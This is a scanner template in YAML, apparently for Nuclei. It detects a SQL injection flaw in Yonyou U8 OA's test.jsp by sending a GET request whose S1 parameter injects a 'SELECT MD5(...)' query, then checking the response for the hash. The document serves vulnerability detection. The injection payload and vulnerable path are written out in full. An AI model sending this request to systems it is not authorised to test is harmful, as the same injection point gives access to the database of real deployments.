id: yongyouOA-U8-test-sql-injection

info:
  name: 用友 U8 OA test.jsp SQL注入漏洞
  author: cnaq 
  severity: high 
  description: 用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20getSessionList.jsp%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
  tags: yongyouOA,U8,sql,injection


requests:
  - method: GET
    path:
      - '{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5("{{randstr}}"))'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        words:
          - '{{md5("{{randstr}}")}}'
